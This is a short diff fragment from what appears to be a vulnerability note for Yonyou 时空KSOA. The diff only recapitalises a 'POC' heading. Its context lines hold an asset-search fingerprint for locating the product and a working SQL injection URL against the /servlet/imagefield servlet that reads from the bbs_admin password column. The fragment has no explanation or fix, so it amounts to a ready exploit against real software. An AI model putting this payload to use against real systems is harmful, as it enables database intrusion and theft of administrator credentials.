@@ -7,7 +7,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 ```
 /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+
 
